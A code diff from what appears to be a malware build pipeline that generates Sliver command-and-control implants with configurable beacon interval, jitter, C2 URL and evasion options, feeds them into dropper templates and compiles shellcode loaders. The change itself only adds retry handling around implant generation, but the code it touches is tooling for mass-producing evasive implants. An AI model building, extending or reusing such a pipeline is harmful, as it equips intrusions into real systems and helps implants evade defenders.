@@ -21,7 +21,7 @@ from pathlib import Path
 
 from .config import Settings
 from .db import Database
-from .sliver import SliverBridge
+from .sliver import BridgeError, SliverBridge
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
 TEMPLATES = REPO_ROOT / "droppers"
@@ -167,20 +167,32 @@ class BuildPipeline:
 
     # -- sliver --------------------------------------------------------------
     def _generate(self, os_name: str, arch: str, fmt: str, req: BuildRequest) -> bytes:
-        payload = {
-            "os": os_name,
-            "arch": arch,
-            "format": fmt,
-            "transport": req.transport,
-            "c2_url": req.c2_url,
-            "is_beacon": req.beacon,
-            "interval": req.interval,
-            "jitter": req.jitter,
-            "evasion": req.evasion,
-            "name": f"fleet-{os_name}-{arch}-{int(time.time())}-{rand4()}",
-        }
-        resp = self.bridge.generate(payload)
-        return base64.b64decode(resp["data_b64"])
+        last: Exception | None = None
+        for attempt in range(3):
+            payload = {
+                "os": os_name,
+                "arch": arch,
+                "format": fmt,
+                "transport": req.transport,
+                "c2_url": req.c2_url,
+                "is_beacon": req.beacon,
+                "interval": req.interval,
+                "jitter": req.jitter,
+                "evasion": req.evasion,
+                "name": f"fleet-{os_name}-{arch}-{int(time.time())}-{rand4()}",
+            }
+            try:
+                resp = self.bridge.generate(payload)
+                return base64.b64decode(resp["data_b64"])
+            except BridgeError as exc:
+                last = exc
+                retryable = any(
+                    k in str(exc) for k in ("closing", "Unavailable", "EOF", "target exists")
+                )
+                if not retryable or attempt == 2:
+                    raise
+                time.sleep(2 * (attempt + 1))
+        raise BuildError(str(last))
 
     def _compile_loader(self, shellcode: bytes, workdir: Path) -> bytes:
         sc_path = workdir / "payload.bin"
